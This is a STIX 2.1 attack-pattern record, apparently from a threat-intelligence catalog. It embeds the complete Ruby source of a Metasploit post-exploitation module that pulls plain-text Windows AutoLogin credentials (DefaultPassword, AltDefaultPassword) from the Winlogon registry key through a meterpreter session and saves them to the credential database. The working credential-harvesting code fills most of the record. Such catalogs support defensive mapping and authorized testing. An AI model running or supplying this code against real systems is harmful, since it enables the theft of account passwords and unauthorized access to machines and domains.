{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--71123fb3-3f9f-4d14-bbf6-9a05e06682b1",
    "created": "2024-08-14T16:33:08.765334Z",
    "modified": "2024-08-14T16:33:08.765337Z",
    "name": "Windows Gather AutoLogin User Credential Extractor",
    "description": " This module extracts the plain-text Windows user login password in Registry. It exploits a Windows feature that Windows (2000 to 2008 R2) allows a user or third-party Windows Utility tools to configure User AutoLogin via plain-text password insertion in (Alt)DefaultPassword field in the registry location - HKLM\\Software\\Microsoft\\Windows NT\\WinLogon. This is readable by all users.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/windows_autologin.rb",
            "external_id": "windows_autologin.rb"
        },
        {
            "source_name": "reference",
            "url": "http://support.microsoft.com/kb/315231"
        },
        {
            "source_name": "reference",
            "url": "http://core.yehg.net/lab/#tools.exploits"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather AutoLogin User Credential Extractor',\n        'Description' => %q{\n          This module extracts the plain-text Windows user login password in Registry.\n          It exploits a Windows feature that Windows (2000 to 2008 R2) allows a\n          user or third-party Windows Utility tools to configure User AutoLogin via\n          plain-text password insertion in (Alt)DefaultPassword field in the registry\n          location - HKLM\\Software\\Microsoft\\Windows NT\\WinLogon. This is readable\n          by all users.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Myo Soe' # YGN Ethical Hacker Group, http://yehg.net\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'References' => [\n          [ 'URL', 'http://support.microsoft.com/kb/315231' ],\n          [ 'URL', 'http://core.yehg.net/lab/#tools.exploits' ]\n        ]\n      )\n    )\n  end\n\n  def run\n    host_name = sysinfo['Computer']\n    print_status(\"Running against #{host_name} on session #{datastore['SESSION']}\")\n\n    creds = []\n\n    has_al = 0\n\n    logon_key = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\'\n    al = registry_getvaldata(logon_key, 'AutoAdminLogon') || ''\n\n    do1 = registry_getvaldata(logon_key, 'DefaultDomainName') || ''\n    du1 = registry_getvaldata(logon_key, 'DefaultUserName') || ''\n    dp1 = registry_getvaldata(logon_key, 'DefaultPassword') || ''\n\n    do2 = registry_getvaldata(logon_key, 'AltDefaultDomainName') || ''\n    du2 = registry_getvaldata(logon_key, 'AltDefaultUserName') || ''\n    dp2 = registry_getvaldata(logon_key, 'AltDefaultPassword') || ''\n\n    if do1 != '' && du1 != '' && (dp1 != '' || (dp1 == '' && al == '1'))\n      has_al = 1\n      creds << [du1, dp1, do1]\n      print_good(\"AutoAdminLogon=#{al}, DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}\")\n    end\n\n    if do2 != '' && du2 != '' && (dp2 != '' || (dp2 == '' && al == '1'))\n      has_al = 1\n      creds << [du2, dp2, do2]\n      print_good(\"AutoAdminLogon=#{al}, AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}\")\n    end\n\n    if has_al == 0\n      print_status(\"The Host #{host_name} is not configured to have AutoLogon password\")\n      return\n    end\n\n    creds.each do |cred|\n      create_credential(\n        workspace_id: myworkspace_id,\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        username: cred[0],\n        private_data: cred[1],\n        private_type: :password,\n        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n        realm_value: cred[2]\n      )\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}